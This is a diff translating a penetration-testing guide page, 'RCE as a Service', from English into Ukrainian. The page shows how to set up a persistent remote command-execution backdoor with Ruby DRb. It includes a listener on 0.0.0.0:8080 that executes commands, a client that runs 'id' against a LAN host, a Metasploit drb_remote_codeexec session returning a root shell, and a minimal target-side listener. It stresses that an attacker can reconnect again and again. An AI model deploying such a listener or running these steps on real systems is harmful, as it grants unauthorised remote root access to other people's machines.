@@ -1,7 +1,7 @@
-# RCE as a Service
-DRb allows Ruby programs to communicate with each other on the same machine or over a network. DRb uses remote method invocation (RMI) to pass commands and data between processes.
+# RCE as a Сервіс
+Модуль DRb(розподілена система об'єктів в Рубі) дозволяє Рубі програмам спілкуватися одна з одною на локальній машині чи через мережу. DRb використовує віддалений метод виклику(RMI) щоб передавати команди та данні між процесами..
 
-## RCE Service 
+## RCE Сервіс 
 ```ruby
 #!/usr/bin/env ruby
 require 'drb'
@@ -15,9 +15,9 @@ end
 DRb.start_service("druby://0.0.0.0:8080", RShell.new)
 DRb.thread.join
 ```
-Note: It works on all OS platforms 
+Примітка: Це працюватиме в будь-якій операційній системі.
 
-The `drb` lib supports ACL to prevent/allow particular IP addresses. ex.
+Бібліотека `drb` підтримує ACL(Access Control List - список контролю доступу) для дозволу чи заборони окремих IP адрес. Наприклад:
 
 ```ruby
 #!/usr/bin/env ruby
@@ -39,14 +39,14 @@ DRb.thread.join
 ```
 
 
-## Client 
+## Клієнт 
 
 ```ruby
 rshell = DRbObject.new_with_uri("druby://192.168.0.13:8080")
 puts rshell.exec "id"
 ```
 
-Or you can use a Metasploit module to get an elegant shell! 
+Або ж ви можете використовувати модуль з Metasploit щоб отримати елегантний шел.
 
 ```bash
 msf > use exploit/linux/misc/drb_remote_codeexec 
@@ -73,10 +73,10 @@ pwd
 id
 uid=0(root) gid=0(root) groups=0(root)
 ```
-As you can see, even you loose the session you can connect again and again; it's a service, remember? 
 
+Як бачите, навіть після втрати сесії залишається можливість підключатися знов і знов: це ж сервіс, пам'ятаєте? 
 
-Note: For using a Metasploit module *only*, you don't need even the RShell class. You just need the following on the target side.
+Примітка: Для використання тільки модуля Metasploit вам навіть не потрібен клас RShell. Вам лише потрібно наступне на атакованій машині:.
 
 ```ruby
 #!/usr/bin/env ruby
@@ -84,6 +84,6 @@ require 'drb'
 DRb.start_service("druby://0.0.0.0:8080", []).thread.join
 ```
 
-I recommend to use the first code in case Metasploit is not available.
+Я рекомендую використовувати перший приклад якщо Metasploit не встановлено або він недоступний.
 
-Read more [technical details](http://blog.recurity-labs.com/archives/2011/05/12/druby_for_penetration_testers/) about the Metasploit module "drb_remote_codeexe"
+До прочитання [Технічні деталі](http://blog.recurity-labs.com/archives/2011/05/12/druby_for_penetration_testers/) про модуль "drb_remote_codeexe" з пакету Metasploit.
